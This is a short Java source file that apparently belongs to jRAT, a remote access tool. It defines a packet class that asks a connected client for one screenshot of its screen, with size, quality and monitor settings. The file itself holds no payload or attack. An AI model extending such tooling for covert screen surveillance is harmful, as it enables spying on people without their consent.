package pro.jrat.client.packets.outgoing;

public class Packet13OneRemoteScreen extends Packet12RemoteScreen {

	public Packet13OneRemoteScreen(double size, int quality, int monitor) {
		super(size, quality, monitor);
	}

	@Override
	public byte getPacketId() {
		return 13;
	}

}
